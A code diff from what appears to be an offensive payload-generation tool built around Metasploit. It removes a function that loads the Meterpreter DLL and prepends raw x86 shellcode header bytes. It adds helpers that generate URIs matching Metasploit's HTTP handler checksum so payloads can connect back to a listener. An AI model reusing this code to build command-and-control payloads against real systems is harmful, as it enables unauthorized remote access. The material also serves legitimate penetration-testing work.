@@ -1,4 +1,5 @@
 """
+
 Contains any miscellaneous helper methods useful across multiple modules.
 
 """
@@ -144,20 +145,29 @@ def obfuscateNum(N, mod):
     return "(%s*%s+%s)" %(left, right, remainder)
 
 
-def selfcontained_patch():
-    if os.path.exists(settings.METASPLOIT_PATH + "/vendor/bundle/ruby/2.1.0/gems/meterpreter_bins-0.0.14/meterpreter/metsrv.x86.dll"):
-        metsrvPath = settings.METASPLOIT_PATH + "/vendor/bundle/ruby/2.1.0/gems/meterpreter_bins-0.0.14/meterpreter/metsrv.x86.dll"
-    else:
-        print "[*] Error: You either do not have the latest version of Metasploit or"
-        print "[*] Error: do not have your METASPLOIT_PATH set correctly in your settings file."
-        print "[*] Error: Please fix either issue then select this payload again!"
-        sys.exit()
+#################################################################
+#
+# HTTP related helpers.
+#
+#################################################################
 
-    f = open(metsrvPath, 'rb')
-    metDLL = f.read()
-    f.close()
+# helper for the metasploit http checksum algorithm
+def checksum8(s):
+    # hard rubyish way -> return sum([struct.unpack('<B', ch)[0] for ch in s]) % 0x100
+    return sum([ord(ch) for ch in s]) % 0x100
 
-    dllheaderPatch = "\x4d\x5a\xe8\x00\x00\x00\x00\x5b\x52\x45\x55\x89\xe5\x81\xc3\xf8"
-    dllheaderPatch += "\x87\x05\x00\xff\xd3\x89\xc3\x57\x68\x04\x00\x00\x00\x50\xff\xd0"
-    dllheaderPatch += "\x68\xe0\x1d\x2a\x0a\x68\x05\x00\x00\x00\x50\xff\xd3\x00\x00\x00"
-    return metDLL, dllheaderPatch
+
+# generate a metasploit http handler compatible checksum for the URL
+def genHTTPChecksum(value="INIT_CONN"):
+    checkValue = 0
+    if value == "INITW": checkValue = 92 # normal initiation
+    elif value == "INIT_CONN": checkValue = 95 # stageless session
+    else: checkValue = 98 # existing session ("CONN")
+
+    chk = string.ascii_letters + string.digits
+    for x in xrange(64):
+        uri = "".join(random.sample(chk,3))
+        r = "".join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))
+        for char in r:
+            if checksum8(uri + char) == checkValue:
+                return uri + char
